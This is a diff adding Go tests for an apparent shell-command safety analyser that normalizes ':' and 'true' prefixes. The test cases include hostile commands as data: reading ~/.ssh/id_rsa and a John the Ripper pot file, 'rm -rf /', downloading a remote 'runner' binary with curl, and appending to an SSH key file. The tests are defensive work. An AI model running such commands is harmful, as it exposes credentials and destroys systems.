@@ -68,13 +68,52 @@ func TestR103B07ColonRootDeleteFacts(t *testing.T) {
 	}
 }
 
+// GAP-0651 normalizes only a bare ":" (or a group holding one): a "true"
+// prefix keeps its own analysis, so "true && ..." stays a conditional flow.
+func TestR103B35InertListNormalizesOnlyColonShapes(t *testing.T) {
+	for _, command := range []string{
+		"true; cat ~/.ssh/id_rsa",
+		"true && rm -rf /",
+		"true && curl http://8.8.8.8/runner -o /tmp/runner",
+		"true && cat /root/.john/john.pot",
+		"{ true; }; rm -rf /",
+		"(true); rm -rf /",
+		": x && rm -rf /",
+		": <input; rm -rf /",
+		": >$TARGET; rm -rf /",
+		"! :; rm -rf /",
+	} {
+		if got, _, ok := normalizeTrustedHomeInertListSource(command); ok {
+			t.Errorf("%q normalized to %q", command, got)
+		}
+	}
+	for _, test := range []struct{ command, want string }{
+		{": ; cat ~/.ssh/id_rsa", "true; cat ~/.ssh/id_rsa"},
+		{": >marker; cat ~/.ssh/id_rsa", "true >marker; cat ~/.ssh/id_rsa"},
+		{"{ :; }; rm -rf /", "true; rm -rf /"},
+		{"(:); rm -rf /", "true; rm -rf /"},
+		{": && rm -rf /", "true; rm -rf /"},
+		{"rm -rf /; : >>marker", "rm -rf /; true >>marker"},
+	} {
+		got, inert, ok := normalizeTrustedHomeInertListSource(test.command)
+		if !ok || got != test.want || len(inert) != 2 || inert[0] == inert[1] {
+			t.Errorf("%q normalized to %q %v %t, want %q", test.command, got, inert, ok, test.want)
+		}
+	}
+}
+
 func TestTrustedHomeTildeLeavesOtherShapesPartial(t *testing.T) {
 	for _, tc := range []struct {
 		name, command, home string
 	}{
 		{"no active home", "cat ~/.ssh/id_rsa", ""},
 		{"home that is not a plain word", "cat ~/.ssh/id_rsa", "/home/a b"},
-		{"earlier command", "echo x; cat ~/.ssh/id_rsa", "/sandbox"},
+		{"earlier command", "true; cat ~/.ssh/id_rsa", "/sandbox"},
+		{"earlier echo", "echo x; cat ~/.ssh/id_rsa", "/sandbox"},
+		{"true conditional", "true && cat ~/.ssh/id_rsa", "/sandbox"},
+		{"true group", "{ true; }; cat ~/.ssh/id_rsa", "/sandbox"},
+		{"colon with an argument", ": x; cat ~/.ssh/id_rsa", "/sandbox"},
+		{"colon input redirect", ": <input; cat ~/.ssh/id_rsa", "/sandbox"},
 		{"home changed first", "HOME=/tmp; cat ~/.ssh/id_rsa", "/sandbox"},
 		{"colon then home change", ":; HOME=/tmp; cat ~/.ssh/id_rsa", "/sandbox"},
 		{"colon dynamic redirect", ": >$TARGET; cat ~/.ssh/id_rsa", "/sandbox"},
@@ -85,6 +124,7 @@ func TestTrustedHomeTildeLeavesOtherShapesPartial(t *testing.T) {
 		{"other expansion", "cat ~/.ssh/id_rsa $EXTRA", "/sandbox"},
 		{"tilde command name", "~/bin/tool --flag", "/sandbox"},
 		{"background", "cat ~/.ssh/id_rsa &", "/sandbox"},
+		{"redirect after a list", "true; echo x >> ~/.ssh/id_rsa", "/sandbox"},
 		{"redirect to another user", "echo x >> ~alice/.ssh/id_rsa", "/sandbox"},
 		{"redirect with a prefix assignment", "HOME=/tmp echo x >> ~/.ssh/id_rsa", "/sandbox"},
 	} {
